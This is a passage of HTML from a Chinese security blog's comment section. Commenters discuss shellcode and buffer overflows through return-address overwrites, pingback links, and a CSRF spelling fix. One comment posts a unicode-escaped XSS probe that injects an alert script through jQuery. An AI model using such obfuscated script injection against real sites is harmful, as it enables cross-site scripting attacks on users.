+记得早期OS环境下，C语言的骇客会故意写一段内存越界的代码来搞破坏，不知能否举例说明？
+</p></blockquote>
+<p>shellcode吧 ，这玩意，以前玩过，没成功，像sprintf函数就存在这种漏洞，利用的就是覆盖函数返回地址，覆盖后地址执行你精心设计的那段代码，反正，设法去执行你注入的代码即可。一般可以防范的是使用安全版本的sprintf用snprintf，好像操作系统内核现在也做了限制，不然修改函数返回地址，因此，这类实验一般还是比较难以在新的内核上实验成功的。</p>
+</div>
+ </article>
+</li>
+<li id="comment-1261285" class="pingback even thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.javablogs.org/?p=223" class="url" rel="ugc external nofollow">从“黑掉Github”学Web安全开发 | java博客，java教程</a> </div>
+</li>
+<li id="comment-1689969" class="pingback odd alt thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.jkeabc.com/p/757938.html" class="url" rel="ugc external nofollow">关于移动端的钓鱼式攻击 – 剑客|关注科技互联网</a> </div>
+</li>
+<li id="comment-1773841" class="comment even thread-even depth-1">
+<article id="div-comment-1773841" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/7c7a7e0d3179803550e8c35ad4a9324a?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/7c7a7e0d3179803550e8c35ad4a9324a?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="http://ssxsss" class="url" rel="ugc external nofollow">xx</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/8711.html/comment-page-2#comment-1773841"><time datetime="2015-10-14T14:07:36+08:00">2015年10月14日 14:07</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>$(‘div:first’).html(‘\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e’);</p>
+</div>
+ </article>
+</li>
+<li id="comment-1778022" class="pingback odd alt thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://f.at2014.com/?p=1319" class="url" rel="ugc external nofollow">程序员疫苗：代码注入 | 且听风吟</a> </div>
+</li>
+<li id="comment-1791985" class="comment even thread-even depth-1">
+<article id="div-comment-1791985" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/d98244ab6774fe13af8bd53c75442569?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/d98244ab6774fe13af8bd53c75442569?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">Sky</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/8711.html/comment-page-2#comment-1791985"><time datetime="2015-11-20T09:34:52+08:00">2015年11月20日 09:34</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>应该是CSRF（Cross Site Request Forgery），而不是CRSF吧！</p>
+</div>
+ </article>
+</li>
+<li id="comment-1910289" class="pingback odd alt thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.xdhcn.com/?p=1162" class="url" rel="ugc external nofollow">从 MongoDB “赎金事件” 看安全问题 | 星达红</a> </div>
+</li>
+</ol>
+<nav class="navigation comment-navigation" role="navigation">
+<h2 class="screen-reader-text">Comment navigation</h2>
+<div class="nav-links">
+<div id="commentnavi">
+<span class="pages"><i class="fa fa-comments"></i> 评论分页</span>
+<div id="commentpager">
+<a class="prev page-numbers" href="/articles/8711.html/comment-page-1#comments">« 上一页</a>
+<a class="page-numbers" href="/articles/8711.html/comment-page-1#comments">1</a>
+<span aria-current="page" class="page-numbers current">2</span> <span id="cp_post_id">8711</span>
+</div>
+<div class="fixed"></div>
+</div>
+</div>
+</nav>
+
+</div>
+</div>
+</div>
+
+</div> 
+</div>
+
+</div>
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body></html>
